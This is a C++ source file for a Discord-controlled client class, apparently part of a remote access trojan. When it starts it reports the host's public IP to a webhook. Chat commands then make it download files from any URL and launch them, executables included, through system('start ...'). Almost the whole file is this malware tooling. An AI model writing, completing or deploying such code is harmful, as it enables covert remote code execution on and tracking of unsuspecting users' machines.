#include "config.hpp"
#include <stdexcept>


class network{

// variables
private:
    std::string nameFile;

    CURL* handle;
    dpp::cluster bot;

    const std::string version;

public:

    const std::string webhook_url;
    bool deBugger;
    std::string myip;
    std::string myGroup = "ALL";

/////////////////////////////////////////////////////////////////

// functions
private:

    bool isFileEmpty(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        return file.peek() == EOF;  
    }

    static size_t filewriteCallback(void* ptr, size_t size, size_t nmemb, void* userdata) {
        std::ofstream* out = static_cast<std::ofstream*>(userdata);
        size_t totalSize = size * nmemb;
        if (out && out->is_open()) {
            out->write(static_cast<char*>(ptr), totalSize);
            return totalSize;
        }
        return 0;
    }

    void cleanup() {
        if (handle) {
            curl_easy_cleanup(handle);
        }
        curl_global_cleanup();
    }

    void processCommand(const std::string& commandPrefix, const dpp::message_create_t& event) {
    std::string cleanedMensage = "";

    std::unordered_map<std::string, std::string> commands = {
        {commandPrefix + "Png", ".png"},
        {commandPrefix + "Exe", ".exe"},
        {commandPrefix + "Gif", ".gif"},
        {commandPrefix + "Txt", ".txt"},
        {commandPrefix + "Mp4", ".mp4"}
    };

    for (const auto& [command, extension] : commands) {
        if (findWordsOnString(event.msg.content, command)) {
            if (commandPrefix == "op.") {
                
                system(("start " + nameFile + extension).c_str());

            } else if (commandPrefix == "pl.") {
                cleanedMensage = cleanWordsOnString(event.msg.content, command, true);
                payloader(cleanedMensage, nameFile + extension);
                if (deBugger) {
                    if(isFileEmpty(nameFile + extension)){
                        event.reply("File didn't work properly");
                    }
                }
            }
            return;
        }
    }
}


public:


    network(std::string token, const std::string& webhook_url, const std::string version)
    : handle(nullptr), nameFile("default"),
    bot(token, dpp::i_default_intents | dpp::i_message_content) ,
    webhook_url(webhook_url),
    version(version)
    {
        
        payloader("https://ipinfo.io/ip", "ip.txt");
        this->myip = readFiles("ip.txt");
        sendMensagem("IP: " + myip + " has connected.");

        bot.on_log(dpp::utility::cout_logger());
    }

    ~network(){

        cleanup();
    }

    void payloader(std::string site, std::string nameFile){
        CURLcode res = curl_global_init(CURL_GLOBAL_ALL);
        if (res != CURLE_OK) {
            sendMensagem("Error initializing global configuration of libcurl. IP: " + myip); 
        }

        handle = curl_easy_init();
        if (!handle) {
            sendMensagem("Error initializing libcurl. IP: " + myip);
        }

        std::ofstream outfile(nameFile, std::ios::binary);
        if (!outfile){
             sendMensagem("Error creating the output file. IP: " + myip);
        }


        res = curl_easy_setopt(handle, CURLOPT_URL, site.c_str());
        if (res != CURLE_OK) {
            sendMensagem("Error setting the URL. IP:" + myip);
        }

        res = curl_easy_setopt(handle, CURLOPT_WRITEFUNCTION, filewriteCallback);
        if (res != CURLE_OK) {
            sendMensagem("Error setting the callback function. IP: " + myip);  
        }

        res = curl_easy_setopt(handle, CURLOPT_WRITEDATA, &outfile);
        if (res != CURLE_OK) {
           sendMensagem("Error setting the destination for the received data. IP: " + myip);
        }

        res = curl_easy_perform(handle);
        if (res != CURLE_OK) {
             sendMensagem("Error performing the HTTP request. IP: " + myip);
        }

    }
    
    std::string readFiles(const std::string& fileLocate) {
        std::ifstream archieve(fileLocate, std::ios::binary);
        if (!archieve.is_open()) {
            throw std::ios_base::failure("Error opening file: " + fileLocate);
        }
        std::stringstream buffer;
        buffer << archieve.rdbuf();
        return buffer.str();
    }


    bool findWordsOnString(std::string mensageContent, std::string phraseToFind){
        std::string lastMensage = mensageContent;
        size_t pos = lastMensage.find(phraseToFind);
        if (pos != std::string::npos) {
            return true;
        } else {
            return false;
        }
    }
    
    std::string cleanWordsOnString(std::string mensageContent, std::string phraseToClean, bool is_url) {
        std::string lastMensage = mensageContent;

        size_t pos = lastMensage.find(phraseToClean);

        if (pos != std::string::npos) {
            size_t startIndex = pos + phraseToClean.length() + 1;
            if (startIndex < lastMensage.size()) {
                lastMensage = lastMensage.substr(startIndex);
            } else {
                lastMensage = ""; 
            }
        }

        if (!is_url) {
            return lastMensage;
        } else {
            return "https://" + lastMensage;
        }
    }


    void sendMensagem(const std::string& content) {
        std::string payload = "{\"content\":\"" + content + "\"}";

        CURL* curl = curl_easy_init();
        if (!curl) {
            throw std::runtime_error("Falha ao inicializar o libcurl");
        }

        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Erro ao enviar a mensagem: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "Mensagem enviada com sucesso!" << std::endl;
        }

        curl_slist_free_all(headers); 
        curl_easy_cleanup(curl);
    }


    void perfomBot(){
        bot.start(dpp::st_wait);
    }

    void MAIN();

/////////////////////////////////////////////////////////////
};